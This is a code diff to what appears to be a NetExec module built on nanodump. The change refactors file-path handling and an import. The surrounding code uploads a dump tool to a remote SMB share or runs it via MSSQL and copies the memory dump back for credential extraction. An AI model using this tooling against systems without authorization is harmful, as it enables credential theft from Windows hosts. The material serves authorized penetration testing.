@@ -4,9 +4,10 @@
 # author of the module : github.com/mpgn
 # nanodump: https://github.com/helpsystems/nanodump
 
+import os
 import base64
 import sys
-import pypykatz
+from pypykatz.pypykatz import pypykatz
 import tempfile
 from datetime import datetime
 from nxc.helpers.bloodhound import add_user_bh
@@ -59,7 +60,6 @@ class NXCModule:
             self.useembeded = False
         else:
             self.nano_path = f"{tempfile.gettempdir()}"
-
         self.dir_result = self.nano_path
 
         if "NANO_EXE_NAME" in module_options:
@@ -76,7 +76,7 @@ class NXCModule:
         self.connection = connection
         self.context = context
         if self.useembeded:
-            with open(self.nano_path + self.nano, "wb") as nano:
+            with open(os.path.join(self.nano_path, self.nano), "wb") as nano:
                 if self.connection.os_arch == 32 and self.context.protocol == "smb":
                     self.context.log.display("32-bit Windows detected.")
                     nano.write(self.nano_embedded32)
@@ -90,14 +90,14 @@ class NXCModule:
                     sys.exit(1)
 
         if self.context.protocol == "smb":
-            with open(self.nano_path + self.nano, "rb") as nano:
+            with open(os.path.join(self.nano_path, self.nano), "rb") as nano:
                 try:
                     self.connection.conn.putFile(self.share, self.tmp_share + self.nano, nano.read)
                     self.context.log.success(f"Created file {self.nano} on the \\\\{self.share}{self.tmp_share}")
                 except Exception as e:
                     self.context.log.fail(f"Error writing file to share {self.share}: {e}")
         else:
-            with open(self.nano_path + self.nano, "rb") as nano:
+            with open(os.path.join(self.nano_path, self.nano), "rb") as nano:
                 try:
                     self.context.log.display(f"Copy {self.nano} to {self.remote_tmp_dir}")
                     exec_method = MSSQLEXEC(self.connection.conn)
@@ -154,7 +154,7 @@ class NXCModule:
 
         if dump:
             self.context.log.display(f"Copying {nano_log_name} to host")
-            filename = f"{self.dir_result}{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log"
+            filename = os.path.join(self.dir_result,f"{self.connection.hostname}_{self.connection.os_arch}_{self.connection.domain}.log")
             if self.context.protocol == "smb":
                 with open(filename, "wb+") as dump_file:
                     try:
